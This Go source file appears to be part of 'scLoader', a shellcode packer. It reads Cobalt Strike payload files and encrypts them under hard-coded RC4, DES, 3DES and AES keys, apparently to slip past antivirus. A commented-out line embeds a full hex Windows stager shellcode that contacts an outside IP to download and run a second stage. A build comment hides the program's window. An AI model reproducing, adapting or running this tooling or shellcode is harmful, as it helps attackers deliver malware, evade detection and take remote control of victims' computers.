package core

import (
	"bufio"
	"crypto/rc4"
	"encoding/base64"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"path"
	"regexp"
	"strings"
)

var (
	// 定义命令行解析参数
	h bool
	v bool
	e string
	//c string
	f string
)

func init() {
	flag.BoolVar(&h, "h", false, "this help `message`")
	flag.BoolVar(&v, "v", false, "show `version` and exit")

	// 注意 `shellcode`。默认是 -s string，有了 `shellcode` 之后，变为 -s shellcode
	flag.StringVar(&e, "e", "Base64", "specify `encryption` mode;You can specify more than one at a time, separated by commas, and the last one must use base64 encoding")
	//flag.StringVar(&c, "c", "", "`shellcode`")
	flag.StringVar(&f, "f", "", "shellcode file,ex:`payload.bin`")

	// 改变默认的 Usage
	flag.Usage = usage

}

func usage() {
	fmt.Fprintf(os.Stderr, `scLoader version: 1.10.0
Usage: scLoader [-e AES,Base64] [-v] [-h] [-f shellcode filename]

Options:
`)
	flag.PrintDefaults()
}

func CmdStart() {
	//go build -trimpath -ldflags="-w -s -H=windowsgui"
	flag.Parse()
	//定义byte[]类型的shellcode,初始化的数据随便写的
	shellcode := []byte{0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52}
	//如果存在未解析的参数， 退出程序
	if len(flag.Args()) != 0 {
		os.Exit(3)
	}
	if h {
		flag.Usage()
	} else if v {
		fmt.Println("SCLoader version: 1.10.0")
	} else {
		var shell string
		if len(f) == 0 {
			os.Exit(3)
		}
		if strings.EqualFold(path.Ext(path.Base(f)), ".bin") {
			//CS通过Raw生成的payload.bin中的shellcode可以通过该方式直接读取
			shellcodeFileData, err := ioutil.ReadFile(f)
			checkError(err)
			shellcode = shellcodeFileData
		} else if strings.EqualFold(path.Ext(path.Base(f)), ".c") {
			//CS通过Raw生成的payload.bin中的shellcode可以通过该方式直接读取
			//shellcodeFileData, err := ioutil.ReadFile(f)
			//checkError(err)
			//shellcode = shellcodeFileData
			//CS生成C语言的payload.c中的shellcode可以通过该方式读取
			file, err := os.OpenFile(f, os.O_RDWR, 0666)
			if err != nil {
				fmt.Println("Open file error!", err)
				return
			}
			defer file.Close()

			stat, err := file.Stat()
			if err != nil {
				panic(err)
			}
			var size = stat.Size()
			fmt.Println("file size=", size)
			filestr := ""
			buf := bufio.NewReader(file)
			for {
				line, err := buf.ReadString('\n')
				line = strings.TrimSpace(line)
				//fmt.Println(line)
				filestr += line
				if err != nil {
					if err == io.EOF {
						r, _ := regexp.Compile("\"(.*)\"")
						fmt.Println(r.FindString(filestr))
						strReplaceAll := strings.ReplaceAll(r.FindString(filestr), "\\x", "")
						strReplaceAll = strings.ReplaceAll(strReplaceAll, "\"", "")
						fmt.Println(strReplaceAll)
						//strReplaceAll1 := "fc4883e4f0e8c8000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d0668178180b0275728b808800000048\n85c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a4\n1584159415a4883ec204152ffe05841595a488b12e94fffffff5d6a0049be77696e696e65740041564989e64c89f141ba4c772607ffd54831c94831d24d31c04d31c94150415041ba3a5679a7ffd5eb735a4889c141b8bb0100004d31\nc9415141516a03415141ba57899fc6ffd5eb595b4889c14831d24989d84d31c9526800024084525241baeb552e3bffd54889c64883c3506a0a5f4889f14889da49c7c0ffffffff4d31c9525241ba2d06187bffd585c00f859d0100004\n8ffcf0f848c010000ebd3e9e4010000e8a2ffffff2f39775558001a86cb8d822142c39115102a069c263511d53f023043a25da76383c6e1f28181901a20aa8654400d4190667d2fc7944a709f921e5f1f8fb54e7c69cf78946cbd2f95\n4cf0aa807d1cc700557365722d4167656e743a204d6f7a696c6c612f352e30202857696e646f7773204e5420362e313b20574f5736343b2054726964656e742f372e303b2072763a31312e3029206c696b65204765636b6f0d0a00d25\nb7457d1b36ec554b43ed0cc1560ab5fca381f28fadb6f03399391acfc6cd693c78c4551116bf6721055930754d5023632633aae6505485aa206693b21cc75698ed7f379fc803e890fa9a9ddf2984f394bdbc9e0a89f13096a7914f980\n93d863b912211ea3e30c6c93aa13558e8abc183c4294f99c11c67c9373558798bfb2e320f55279314abe112d39cc64f129a239f14e9defa059a4895ed3125fa7690ffa047573f298ce6dfb2ff7b40606e99c58297a7825744372c4540\nab80ec6c32d092328f497a7b935d0c02c87561b34b5818b04bf7b7a1371126e6d5a0041bef0b5a256ffd54831c9ba0000400041b80010000041b94000000041ba58a453e5ffd5489353534889e74889f14889da41b8002000004989f9\n41ba129689e2ffd54883c42085c074b6668b074801c385c075d758585848050000000050c3e89ffdffff34362e32392e3136302e3635005109bf6d"
						shellcode, err = hex.DecodeString(strReplaceAll)
						//shellcode = []byte(strReplaceAll)
						if err != nil {
							fmt.Println(err)
						}
						fmt.Println("File read ok!")
						break
					} else {
						fmt.Println("Read file error!", err)
						return
					}
				}
			}
		}
		slice := strings.Split(e, ",")
		for i := 0; i < len(slice); i++ {
			if strings.EqualFold(slice[i], "Base64") {
				shell = base64.StdEncoding.EncodeToString(shellcode)
				shellcode = []byte(shell)
			} else if strings.EqualFold(slice[i], "rc4") {
				//加密操作,直接覆盖源数据
				cipherde, _ := rc4.NewCipher([]byte("momohk"))
				cipherde.XORKeyStream(shellcode, shellcode)
			} else if strings.EqualFold(slice[i], "des") {
				shellcode, _ = DesEncrypt(shellcode, []byte("vikeryoo"))
			} else if strings.EqualFold(slice[i], "3des") {
				shellcode, _ = TripleDesEncrypt(shellcode, []byte("123456789012345678901234"), []byte("yoooyooq"))
			} else if strings.EqualFold(slice[i], "aes") {
				shellcode = AesEncryptCBC(shellcode, []byte("yoolaescbcuuyool"))
			} else {
				os.Exit(3)
			}
			fmt.Println(slice[i])
		}
		fmt.Println(shell)
	}
}
